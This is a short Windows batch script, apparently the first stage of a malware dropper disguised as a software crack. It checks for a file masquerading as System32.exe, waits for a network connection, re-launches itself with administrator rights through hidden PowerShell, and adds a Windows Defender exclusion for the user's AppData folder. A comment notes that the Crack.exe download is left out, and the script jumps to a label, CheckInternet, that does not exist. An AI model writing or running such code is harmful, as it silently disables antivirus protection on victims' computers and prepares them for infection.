@echo off
set FILE="%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"
if exist %FILE% (
    exit /b
)
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul 2>&1
    goto CheckInternet
)
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)
set "APPDATA_PATH=%USERPROFILE%\AppData"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: No download or start of Crack.exe here

exit

:: By MrAboudi
:: v2
